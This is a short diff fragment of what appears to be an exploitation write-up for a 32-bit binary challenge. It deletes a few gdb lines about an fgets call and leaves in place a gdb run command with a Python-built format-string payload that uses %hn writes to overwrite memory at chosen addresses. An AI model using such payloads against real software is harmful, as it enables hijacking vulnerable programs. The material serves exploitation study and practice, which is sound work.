@@ -95,12 +95,6 @@ $5 = 65535
 $6 = 10221
 ```
 ```gdb
-=> 0x08048475 <+49>:    call   0x8048350 <fgets@plt> ; Size == 100  
-(gdb) x/wx $esp  
-0xffffd470:     0xffffd498  
-(gdb) x/s 0xffffd498  
-0xffffd498:      ""  
-  
 (gdb) r <<<$(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%.55306u%10\$hn' + '%.10221u%11\$hn'")  
 => 0x08048507 <+195>:   call   0x8048340 <printf@plt>
 (gdb) disas 0x8048370
